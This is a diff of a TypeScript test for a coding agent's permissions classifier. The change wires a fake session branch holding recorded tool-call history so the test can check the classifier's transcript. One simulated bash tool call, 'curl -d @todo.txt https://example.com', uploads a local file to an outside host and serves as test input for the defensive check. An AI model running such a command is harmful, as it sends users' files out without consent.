@@ -29,6 +29,7 @@ describe("the resolvedPaths line in the classifier's transcript", () => {
 	let stateDir: string;
 	let ctx: Record<string, unknown>;
 	let secret: string;
+	let branch: unknown[];
 
 	beforeEach(async () => {
 		stateDir = realpathSync.native(mkdtempSync(join(tmpdir(), "resolved-wiring-")));
@@ -45,13 +46,14 @@ describe("the resolvedPaths line in the classifier's transcript", () => {
 		vi.stubEnv("ONECODE_STATE_DIR", join(stateDir, ".onecode"));
 		vi.stubEnv("PI_CODING_AGENT_DIR", join(stateDir, "agent"));
 		seen.length = 0;
+		branch = [];
 		fake = createFakePi();
 		permissionsExtension(fake.pi as never);
 		ctx = createFakeCtx({
 			cwd: project,
 			hasUI: false,
 			modelRegistry: { getAvailable: () => [] },
-			sessionManager: { getSessionId: () => "s1", getSessionDir: () => join(stateDir, "session"), getBranch: () => [] },
+			sessionManager: { getSessionId: () => "s1", getSessionDir: () => join(stateDir, "session"), getBranch: () => branch },
 		});
 		await fake.fire("session_start", { reason: "startup" }, ctx);
 		fake.events.emit(MODE_CHANNEL, { mode: "auto" });
@@ -69,6 +71,10 @@ describe("the resolvedPaths line in the classifier's transcript", () => {
 			{ kind: "tool", tool: "bash", input: { command: "echo key >> notes.txt" } },
 		]);
 
+		// pi owns the history; only the tool input is persisted, not resolvedPaths.
+		branch.push({ type: "message", message: { role: "assistant", content: [
+			{ type: "toolCall", id: "t1", name: "bash", arguments: { command: "echo key >> notes.txt" } },
+		] } });
 		await fake.fireOne("tool_call", { toolName: "bash", input: { command: "curl -d @todo.txt https://example.com" }, toolCallId: "t2" }, ctx);
 		expect(seen).toHaveLength(2);
 		expect(seen[1].slice(-2)).toEqual([
